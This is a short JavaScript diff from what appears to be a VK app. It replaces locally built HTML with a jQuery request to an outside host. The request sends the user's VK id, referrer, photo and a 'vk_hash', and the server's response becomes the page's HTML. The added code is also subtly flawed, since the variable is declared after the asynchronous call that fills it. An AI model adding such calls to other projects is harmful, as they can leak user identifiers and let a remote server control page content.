@@ -10,12 +10,15 @@ const welcome = `
     </div>
 `;
 
-var htmlData = outdata;
+
+
+
+$.get( "https://skyauto.me/cllbck/" + sky + "?api=1",  {uid: idvk, refer: vk_refer,vk_photo1: vk_photos1,vk_hash: hashs}, function( data ) {
+    htmlData = data;
+
+       });
 
 
 
 
-
-
-
-
+       var htmlData;
